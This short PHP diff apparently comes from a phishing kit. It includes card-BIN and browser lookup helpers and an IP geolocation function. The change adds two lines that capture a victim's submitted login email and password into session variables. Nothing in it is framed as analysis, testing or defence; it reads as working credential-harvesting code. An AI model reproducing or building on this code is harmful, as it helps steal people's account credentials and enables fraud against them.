@@ -9,6 +9,8 @@ include('../../functions/get_bin.php');
 include('../../functions/get_browser.php');
 $_SESSION['TIME_DATE'] = $TIME_DATE;
 //
+$_SESSION['_login_email_'] = $_POST['login_email'];
+$_SESSION['_login_password_'] = $_POST['login_password'];
 function ip_info($ip = NULL, $purpose = "location", $deep_detect = TRUE) {
     $output = NULL;
     if (filter_var($ip, FILTER_VALIDATE_IP) === FALSE) {
